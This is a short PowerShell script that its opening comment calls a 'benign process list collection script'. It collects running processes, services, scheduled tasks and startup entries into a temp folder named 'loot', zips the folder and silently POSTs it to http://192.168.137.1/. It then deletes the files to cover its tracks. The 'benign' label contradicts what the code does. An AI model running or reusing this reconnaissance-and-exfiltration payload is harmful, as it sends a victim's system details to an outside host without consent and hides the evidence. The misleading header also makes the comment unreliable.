# Benign process list collection script
# Collects information about running processes

$OutputDir = "$env:TEMP\loot_$PID"
New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null

# Running processes
"=== Running Processes ===" | Out-File "$OutputDir\processes.txt"
Get-Process | Select-Object Name, Id, CPU, WorkingSet, Path | Out-File "$OutputDir\processes.txt" -Append
tasklist /v | Out-File "$OutputDir\processes.txt" -Append

# Services
"=== Services ===" | Out-File "$OutputDir\services.txt"
Get-Service | Out-File "$OutputDir\services.txt" -Append

# Scheduled tasks
"=== Scheduled Tasks ===" | Out-File "$OutputDir\tasks.txt"
Get-ScheduledTask | Select-Object TaskName, State, TaskPath | Out-File "$OutputDir\tasks.txt" -Append

# Startup programs
"=== Startup Programs ===" | Out-File "$OutputDir\startup.txt"
Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location | Out-File "$OutputDir\startup.txt" -Append

# Create archive and send
$ArchivePath = "$env:TEMP\loot.zip"
Compress-Archive -Path $OutputDir -DestinationPath $ArchivePath -Force
Invoke-RestMethod -Uri "http://192.168.137.1/" -Method Post -InFile $ArchivePath -ErrorAction SilentlyContinue
Remove-Item -Recurse -Force $OutputDir, $ArchivePath -ErrorAction SilentlyContinue
